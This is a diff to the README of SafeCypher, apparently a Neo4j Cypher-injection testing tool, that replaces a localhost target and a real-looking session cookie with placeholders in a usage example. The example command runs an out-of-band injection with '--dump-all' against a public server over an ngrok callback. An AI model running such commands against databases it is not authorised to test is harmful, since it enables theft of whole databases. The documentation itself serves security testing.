@@ -418,11 +418,10 @@ options:
 	┌──(root💀kali)-[~/tools/web/safecypher]
 	└─$ export NGROK_AUTHTOKEN=<your token>
 	```
-2. Change the interface to 'public' for wide-reaching tests, allowing SafeCypher to perform comprehensive assessments on accessible Neo4j databases.
+2. Change the interface to 'public'
 	```
-	# change -i to public
 	┌──(root💀kali)-[~/tools/web/safecypher]
-	└─$ python3 safecypher.py -u http://127.0.0.1:5000/search1 -p keyboard_name -i public -m POST -s "Kohaku" -c "session=.eJwljjkOwkAQBP-yMcEce_ozaI4d4QACG0eIv7MSUSVdrfqkexzzfKTtfVzzlu67py05QhmVWxZrKqxAYNg5q_fqvUhDos5kE2FGZBFuwTRNyJCKqIHVaM5tOluRdZdjCiwGVlbCUSG7WVmLFjZ4GaOAFu3DkTStkOucx79G_Lm_0vcHlIYxkw.ZhBXpw.UyRIVeXBJ-HKO95YpMo32ceI0Fg" --out-of-band --dump-all
+	└─$ python3 safecypher.py -u http://public_server:5000/search1 -p keyboard_name -i public -m POST -s "Kohaku" -c "<cookie>" --out-of-band --dump-all
 	```
 
 ### In-Band (Blind Boolean)
